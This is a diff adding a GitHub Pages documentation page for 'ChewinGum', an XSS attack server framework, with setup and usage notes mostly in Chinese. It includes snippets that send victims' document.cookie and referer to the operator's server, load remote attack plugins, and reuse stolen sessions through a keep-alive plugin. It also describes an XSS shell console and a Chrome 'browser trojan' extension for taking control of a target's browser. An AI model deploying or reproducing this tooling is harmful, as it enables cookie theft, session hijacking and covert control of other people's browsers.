@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset='utf-8' />
+    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
+    <meta name="description" content="ChewinGum : ChewinGum" />
+
+    <link rel="stylesheet" type="text/css" media="screen" href="stylesheets/stylesheet.css">
+
+    <title>ChewinGum</title>
+  </head>
+
+  <body>
+
+    <!-- HEADER -->
+    <div id="header_wrap" class="outer">
+        <header class="inner">
+          <a id="forkme_banner" href="https://github.com/quininer/gum">View on GitHub</a>
+
+          <h1 id="project_title">ChewinGum</h1>
+          <h2 id="project_tagline">ChewinGum</h2>
+
+            <section id="downloads">
+              <a class="zip_download_link" href="https://github.com/quininer/gum/zipball/master">Download this project as a .zip file</a>
+              <a class="tar_download_link" href="https://github.com/quininer/gum/tarball/master">Download this project as a tar.gz file</a>
+            </section>
+        </header>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div id="main_content_wrap" class="outer">
+      <section id="main_content" class="inner">
+        <h1>
+<a name="chewingum-alpha021140214" class="anchor" href="#chewingum-alpha021140214"><span class="octicon octicon-link"></span></a>Chewingum [alpha][0.2][1140214]</h1>
+
+<h2>
+<a name="name" class="anchor" href="#name"><span class="octicon octicon-link"></span></a>Name</h2>
+
+<p><strong>chewingum - individual XSS server framework</strong></p>
+
+<h2>
+<a name="startup" class="anchor" href="#startup"><span class="octicon octicon-link"></span></a>Startup</h2>
+
+<pre><code>python ./config.py install [ domain salt filekeyPath | -h ]
+python ./chewingum.py [ -h | host port debug ]
+</code></pre>
+
+<h2>
+<a name="dependencies" class="anchor" href="#dependencies"><span class="octicon octicon-link"></span></a>Dependencies</h2>
+
+<ul>
+<li><a href="http://bottlepy.org/">Bottle-0.11</a></li>
+<li><a href="https://github.com/zeekay/bottle-websocket/">Bottle-websocket</a></li>
+<li>
+<p><a href="http://sdiehl.github.io/gevent-tutorial/">GeventWebSocketServer</a></p>
+
+<h2>
+<a name="unnecessaries" class="anchor" href="#unnecessaries"><span class="octicon octicon-link"></span></a>unnecessaries</h2>
+
+<ul>
+<li><a href="http://beaker.rtfd.org/">Beaker</a></li>
+</ul>
+</li>
+</ul><h2>
+<a name="reference" class="anchor" href="#reference"><span class="octicon octicon-link"></span></a>Reference</h2>
+
+<ul>
+<li>(Gum.js) - <a href="http://zone.wooyun.org/content/2113">xss.js</a>
+       - <a href="http://beefproject.com/">BeEF</a>
+</li>
+</ul><h2>
+<a name="helptext" class="anchor" href="#helptext"><span class="octicon octicon-link"></span></a>Helptext</h2>
+
+<ul>
+<li>1.login</li>
+</ul><p>采用filekey验证, 上传filekey或输入URL便可登录.</p>
+
+<ul>
+<li>2.server</li>
+</ul><p>server处代码会直接在项目触发时执行,<br>
+最终会将变量serverinfo和变量browserinfo保存至数据库,<br>
+格式需为json/dict格式</p>
+
+<pre><code>{'name':'value'}
+</code></pre>
+
+<p>如:</p>
+
+<pre><code>serverinfo = {
+    'referer':b64encode(str(request.headers.get('Referer'))),
+    'ctime':b64encode(str(ctime()))
+}
+browserinfo = {
+    'cookie':b64encode(str(request.forms.get('cookie')))
+}
+</code></pre>
+
+<ul>
+<li>3.server code keyword</li>
+</ul><p>iferror<br>
+对变量iferror赋值, 会触发对应错误.<br>
+如:</p>
+
+<blockquote>
+<p>iferror = 404</p>
+</blockquote>
+
+<p>returns<br>
+对变量returns赋值，在iferror为空的情况下, 会返回对其赋值的内容.<br>
+如:</p>
+
+<blockquote>
+<p>returns = ''</p>
+</blockquote>
+
+<p>gum.backinfo<br>
+客户端的关键字，是一个字典，默认用来暂时记录返回的信息。<br>
+当返回之后最好清空它。</p>
+
+<blockquote>
+<p>gum.backinfo = {};</p>
+</blockquote>
+
+<ul>
+<li>4.project name and object name</li>
+</ul><p>project 的项目名需是xss触发处的url或是domain.<br>
+$default是默认项目, xss触发时若未发现对应项目则按照此配置进行.</p>
+
+<pre><code>object 的项目名可随意更改.
+</code></pre>
+
+<ul>
+<li>5.plugins</li>
+</ul><p>可以这样导入server扩展,</p>
+
+<pre><code>with open('./plus/get_info.py') as files: exec files.read()
+</code></pre>
+
+<p>也可以这样</p>
+
+<pre><code>from plus.email_remind import send_mail
+send_mail(gum_emailremind)
+
+具体看扩展的写法
+</code></pre>
+
+<p>可以这样导入browser插件,</p>
+
+<pre><code>gum.script('http://' + gum.domain + '/static/plus/tool_boomerang.js')
+</code></pre>
+
+<p>这样给browser插件传参,</p>
+
+<pre><code>gum_boomerang = {
+    'object_url':'http://localhost/xss',
+    'post':{'xss':'yes', 'csrf':'no'},
+    'eval':function(){alert(1)}
+}
+</code></pre>
+
+<p>同样的方法给server扩展传参,</p>
+
+<pre><code>gum_keepsession = {
+    'url':referer,
+    'session':cookie,
+    'data':{'a':'b'},
+    'frequency':300,
+    'endate':'2013-12-12 15:17:00'
+}
+</code></pre>
+
+<ul>
+<li>6.set code</li>
+</ul><p>这样发送browser info,</p>
+
+<pre><code>gum.post('http://' + gum.domain + '/ing', {'cookie':document.cookie})
+</code></pre>
+
+<p>单次接收browser info可以参考上面的2.server<br>
+也可以这样</p>
+
+<pre><code>browserinfo['infoname'] = b64encode(str(request.forms.get('infoname')))
+</code></pre>
+
+<p>多次接收browser info可以像这样,</p>
+
+<pre><code>info_cookie = str(request.forms.get('cookie'))
+sessionid[referer][1]['cookie'] = info_cookie
+browserinfo = b64encode(sessionid.get(referer))
+</code></pre>
+
+<ul>
+<li><p>不推荐使用多次接收，默认已关闭。</p></li>
+<li><p>7.other</p></li>
+</ul><p>使用基本探针:</p>
+
+<p>server:</p>
+
+<pre><code>with open('./plus/get_info.py') as files: exec files.read()
+</code></pre>
+
+<p>browser:</p>
+
+<pre><code>gum.script('http://' + gum.domain + '/static/plus/get_info.js', function(){
+    gum.post('http://' + gum.domain + '/ing', gum.backinfo);
+    gum.backinfo = {};
+})
+</code></pre>
+
+<ul>
+<li>8.console</li>
+</ul><p>javascript文件在</p>
+
+<pre><code>./static/plus/onexsshell.js
+
+尚在测试阶段。
+</code></pre>
+
+<ul>
+<li>9.browser trojan</li>
+</ul><p>chrome<br>
+修改./trojan/chrome/gum.js中的{{domain}}为你的chewingum的域名及端口<br>
+使用chrome or chromium打包<br>
+安装在目标的浏览器后，使用console即可操作目标浏览器。  </p>
+
+<pre><code>尚在测试阶段
+</code></pre>
+      </section>
+    </div>
+
+    <!-- FOOTER  -->
+    <div id="footer_wrap" class="outer">
+      <footer class="inner">
+        <p class="copyright">ChewinGum maintained by <a href="https://github.com/quininer">quininer</a></p>
+        <p>Published with <a href="http://pages.github.com">GitHub Pages</a></p>
+      </footer>
+    </div>
+
+    
+
+  </body>
+</html>
